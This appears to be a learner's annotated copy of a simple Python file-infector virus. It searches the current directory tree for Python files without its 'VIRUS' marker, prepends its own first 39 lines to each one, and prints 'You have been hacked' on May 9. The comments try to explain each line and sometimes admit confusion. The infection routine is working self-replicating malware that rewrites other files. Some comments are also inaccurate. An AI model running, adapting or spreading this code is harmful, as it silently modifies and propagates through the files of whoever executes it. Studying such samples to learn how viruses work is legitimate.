#!/usr/bin/python3
# imports the operating system the command is running on 
import os
# imports the date and time of the operating system
import datetime
# makes a variable names signature that stores the string "VIRUS"
SIGNATURE = "VIRUS"
# This defines a function called locate(path)
def locate(path):
	#This is saying the files targeted while be added through out the code since [] is an empty list
    files_targeted = []
	# file list variable is operating system list directory path 
    filelist = os.listdir(path)
	# for every filename in the list of files do 
    for fname in filelist:
		# if loop that is saying (isdir checks if the directory exists) if at this path there is a file then true
        if os.path.isdir(path+"/"+fname):
		# the below line will add the file names to the files_targeted variable
            files_targeted.extend(locate(path+"/"+fname))
		# if the file name has the .py extension (is a python file)
        elif fname[-3:] == ".py":
		# its not infected
            infected = False
		# for every singe line in the file 
            for line in open(path+"/"+fname):
			# if signature variable is true then
                if SIGNATURE in line:
			# Infected is true
                    infected = True
			# then stop
                    break
		# if the the file is not infected then
            if infected == False:
			# add infected to every line in the scanned file
                files_targeted.append(path+"/"+fname)
	# show the user the files that were targeted
    return files_targeted

# makes a function that calls the files_targeted variale (files were added to this variable by the command)
def infect(files_targeted):
	# opens up a file at that path and makes it a part of the virus variable
    virus = open(os.path.abspath(__file__))
	# makes variable virus string an empty variable
    virusstring = ""
	# for item and line makes each line a variable or something? I cant quite figure this one out 
    for i,line in enumerate(virus):
		# this line of code checks if it should do things to the lines of text? Another one I dont really understand
        if 0 <= i < 39:
            virusstring += line
	# closes the virus variable?
    virus.close
    for fname in files_targeted:
        f = open(fname)
		# the contents of the file are made into a variable
        temp = f.read()
        f.close()
		# makes a file that opens in write mode
        f = open(fname,"w")
		# writes whats ever added to virus string variable + reads it 
        f.write(virusstring + temp)
		# closes the f file
        f.close()
# Makes a function called detonate
def detonate():
	# Script will import date time of operating system and if the date is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
		# print You have been hacked
        print("You have been hacked")
# redoes the files_targeted variable to those at that path
files_targeted = locate(os.path.abspath(""))
# use infect to infect the files in the files_targeted variable
infect(files_targeted)
# calls the function to work
detonate()
